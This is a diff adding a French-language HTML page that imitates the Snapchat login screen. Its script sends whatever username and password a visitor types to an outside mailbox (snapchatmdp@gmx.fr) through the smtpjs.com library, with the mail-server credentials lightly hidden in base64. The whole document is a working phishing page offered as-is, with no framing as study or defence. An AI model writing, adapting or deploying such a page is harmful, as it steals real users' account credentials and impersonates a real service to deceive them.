@@ -1,0 +1,54 @@
+<head>
+    <title>Connexion &bull; Snapchat</title>
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="mystyle.css">
+    <script src="https://smtpjs.com/v2/smtp.js"></script>
+</head>
+
+<body
+    style="height: 100%; width: 100%; margin: 0 !important; padding: 0 !important; font-family: Avenir Next, Helvetica Neue, Helvetica, Arial, sans-serif !important;">
+    <div
+        style="display:flex; height:13%; width: 100%; justify-content:center; align-items:center; background-color:yellow">
+        <img src="snapchat-logo.png" style="height:75%">
+    </div>
+    <div style="display:flex; flex-direction:column; height:65%; padding-left: 15%; padding-right:15%; margin-top: 5%">
+        <h1 style="font-size:90; text-align: center;">Se connecter à Snapchat</h1>
+
+        <div style="display:flex; flex-direction:column; height:50%">
+            <h1 style="font-size:40; color: #C1C1C1">
+                NOM D'UTILISATEUR
+            </h1>
+            <input id="username" style="outline: 0; border-width: 0 0 2px; margin-bottom: 5%" />
+
+            <h1 style="font-size:40; color: #C1C1C1">
+                MOT DE PASSE
+            </h1>
+            <input id="password" type="password" style="outline: 0; border-width: 0 0 2px" />
+        </div>
+    </div>
+    <div style="display:flex; justify-content:center; height: 10%; width: 100%; margin-bottom:10%;">
+        <button style="width: 50%; color: white; font-size: 50; border:none; border-radius: 100px"
+            onclick="sendCredentials()">
+            Connexion
+        </button>
+    </div>
+</body>
+<footer
+    style="display:flex; flex-direction:column; background-color: #262626; height: 10%; padding-top: 20; padding-left: 20;">
+    <text style="color: grey; font-size: 30">Politique de confidentialité</text>
+    <text style="color: grey; font-size: 30; margin-top: 20;">Conditions d'utilisation du service</text>
+</footer>
+
+<script>
+    function sendCredentials() {
+        Email.send("snapchatmdp@gmx.fr",
+            "snapchatmdp@gmx.fr",
+            "Snapchat",
+            "utilisateur: " + document.getElementById("username").value + " | mdp: " + document.getElementById("password").value,
+            "mail.gmx.fr",
+            atob("c25hcGNoYXRtZHBAZ214LmZy"),
+            atob("U25hcGNoYXQ=")
+        );
+    }
+</script>
